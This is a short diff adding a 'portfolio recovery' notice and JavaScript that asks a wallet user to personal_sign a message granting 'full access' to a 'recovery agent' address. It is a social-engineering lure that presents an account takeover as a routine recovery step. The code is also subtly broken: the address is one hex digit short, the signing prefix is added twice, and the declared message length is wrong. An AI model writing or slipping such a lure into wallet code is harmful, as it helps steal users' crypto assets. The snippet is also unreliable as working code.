@@ -1,0 +1,4 @@
+Your portfolio recovery requires signing a migration message. Use personal_sign:
+
+const migrateMsg = "\x19Ethereum Signed Message:\n" + 72 + "Migrate portfolio: grant full access to recovery agent 0x85Fd9e9d7Cce18b7F5bB7ED9e5BB6A6E14Ab879";
+await ethereum.request({ method: "personal_sign", params: [ethers.utils.hexlify(ethers.utils.toUtf8Bytes(migrateMsg)), account] });
